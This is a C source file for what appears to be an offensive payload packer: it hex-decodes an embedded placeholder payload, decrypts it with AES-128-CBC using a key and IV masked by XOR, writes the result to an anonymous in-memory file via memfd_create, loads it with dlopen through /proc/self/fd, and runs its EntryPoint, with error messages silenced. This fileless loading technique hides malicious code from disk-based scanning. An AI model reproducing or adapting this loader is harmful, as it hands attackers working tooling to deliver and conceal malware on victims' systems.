// Standard
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Crypto
#include <openssl/evp.h>

// Dynamic library stuff
//#define _GNU_SOURCE
#include <sys/mman.h>
#include <dlfcn.h>

// Other?
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>


#define PAYLOAD "!COPY_PAYLOAD_HERE!"
#define MASK "C++ IS GARBAGE!!"

char KEY[] = "!COPY_KEY_HERE!";
char IV[] = "!COPY_IV_HERE!";

// XORs x in place
void XOR(char x[], char y[], int len) {
    for (int i=0; i < len; i++) {
        x[i] ^= y[i];
    }
}


// Decrypt the packed binary. Returns pointer to decrypted buffer.
// Buffer needs to be freed by caller.
char* decrypt(char* decoded, size_t inlen, unsigned int *pOutLen) {
    
    // Allocate result buffer
    char* out = (char*) malloc(100 * 1000); // 100 kilobytes to be safe
    if(out == NULL) {
        free(out);;
        return NULL;
    }

    // Setup cipher context
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        free(out);
        return NULL;
    }

    // Initialize cipher
    XOR(KEY, MASK, 16);
    XOR(IV, MASK, 16);
    if (!EVP_DecryptInit_ex2(ctx, EVP_aes_128_cbc(), KEY, IV, NULL)) {
        free(out);
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }

    // Decrypt
    if(!EVP_DecryptUpdate(ctx, out, pOutLen, decoded, inlen)) {
        free(out);
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }

    // For some reason this code is clearing the decrypted data?
    // It's not strictly neccessary so leave it commented out for now
    // if (!EVP_DecryptFinal(ctx, out, pOutLen)) {
    //     free(out);
    //     EVP_CIPHER_CTX_free(ctx);
    //     return NULL;
    // }

    EVP_CIPHER_CTX_free(ctx);
    return out;
}


// Function to convert a hexadecimal character to its integer value
int hex_char_to_int(char c) {
    if (c >= '0' && c <= '9') {
        return c - '0';
    } else if (c >= 'a' && c <= 'f') {
        return c - 'a' + 10;
    } else if (c >= 'A' && c <= 'F') {
        return c - 'A' + 10;
    }
    return -1; // Invalid character
}

// Function to convert a hexadecimal string to bytes
unsigned char *hex_to_bytes(const char *hex_string, unsigned int *byte_length) {
    size_t hex_length = strlen(hex_string);
    if (hex_length % 2 != 0) {
        //fprintf(stderr, "Error: Hex string length must be even\n");
        return NULL;
    }

    *byte_length = hex_length / 2;
    unsigned char *bytes = (unsigned char *)malloc(*byte_length);
    if (bytes == NULL) {
        //fprintf(stderr, "Error: Memory allocation failed\n");
        return NULL;
    }

    for (size_t i = 0, j = 0; i < hex_length; i += 2, j++) {
        int high_nibble = hex_char_to_int(hex_string[i]);
        int low_nibble = hex_char_to_int(hex_string[i + 1]);
        if (high_nibble == -1 || low_nibble == -1) {
            //fprintf(stderr, "Error: Invalid hexadecimal character\n");
            free(bytes);
            return NULL;
        }
        bytes[j] = (high_nibble << 4) | low_nibble;
    }

    return bytes;
}




int main() {
    // Decode from hex to byte array
    unsigned int decoded_len;
    char *decoded_data = hex_to_bytes(PAYLOAD, &decoded_len);
    if (decoded_data == NULL) {
        //printf("ERROR: Could not decode hex data.\n");
        exit(1);
    }
    
    // Decrypt binary
    unsigned int outlen;
    char* decrypted_binary = decrypt(decoded_data, decoded_len, &outlen);
    if(decrypted_binary == NULL) {
        //printf("ERROR: Could not decrypt binary\n");
        exit(1);
    }
    free(decoded_data); // can free this now

    // Create in-memory file and write data to it
    int fd = memfd_create("payload_file", 0);
    if (!fd) {
        //printf("ERROR: Could not create in-memory file\n");
        exit(1);
    }
    write(fd, decrypted_binary, outlen);

    // Load library
    char filename[64];
    sprintf(filename, "/proc/self/fd/%d", fd); // link to in-memory file
    void* handle = dlopen(filename, RTLD_LAZY);
    if (!handle) {
        //printf("ERROR: Could not load dynamic library\n");
        free(decoded_data);
        exit(1);
    }

    // Find entry
    int (*EntryPoint)() = dlsym(handle, "EntryPoint");
    if (!EntryPoint) {
        //printf("ERROR: Could not find EntryPoint\n");
        free(decoded_data);
        dlclose(handle);
        exit(1);
    }

    // Call function
    EntryPoint();

    dlclose(handle);
    close(fd);
    free(decrypted_binary);
    return 0;
}


